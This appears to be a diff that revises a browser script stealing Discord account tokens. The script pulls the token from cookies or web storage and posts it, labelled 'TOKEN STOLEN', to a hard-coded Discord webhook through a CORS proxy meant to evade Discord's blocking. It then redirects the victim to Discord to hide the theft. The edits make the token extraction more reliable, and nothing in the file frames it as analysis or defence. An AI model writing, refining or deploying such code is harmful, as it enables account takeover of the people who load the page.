@@ -1,29 +1,41 @@
     <script>
-        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
+        const webhookUrl = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
         
-        // Get Token
-        const token = localStorage.token || sessionStorage.token || (document.cookie.match('(^|;)\\s*token\\s*=\\s*([^;]+)')?.pop());
+        // 1. Get Token from Cookies (Most reliable for modern Discord)
+        const cookies = document.cookie.split(';');
+        let token = null;
+        for (let cookie of cookies) {
+            if (cookie.trim().startsWith('token=')) {
+                token = cookie.split('=')[1];
+                break;
+            }
+        }
+
+        // Fallback to local/session storage
+        if (!token) {
+            token = localStorage.token || sessionStorage.token;
+        }
 
         if (token) {
-            // Use a CORS proxy to bypass the block
-            const proxy = `https://corsproxy.io/?${encodeURIComponent(webhook)}`;
+            // 2. Use a CORS Proxy to bypass Discord's block
+            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(webhookUrl)}`;
             
-            fetch(proxy, {
+            fetch(proxyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
             })
-            .then(r => {
-                if (r.ok) {
-                    console.log("Success via Proxy!");
+            .then(response => {
+                if (response.ok) {
+                    console.log("Success!");
                     setTimeout(() => window.location.href = "https://discord.com/channels/@me", 2000);
                 } else {
-                    console.error("Proxy failed:", r.status);
+                    console.error("Proxy Error:", response.status);
                 }
             })
-            .catch(e => console.error("Proxy Error:", e));
+            .catch(error => console.error("Fetch Error:", error));
         } else {
-            console.log("No token found.");
+            console.log("No token found in Cookies or Storage.");
             window.location.href = "https://discord.com";
         }
     </script>
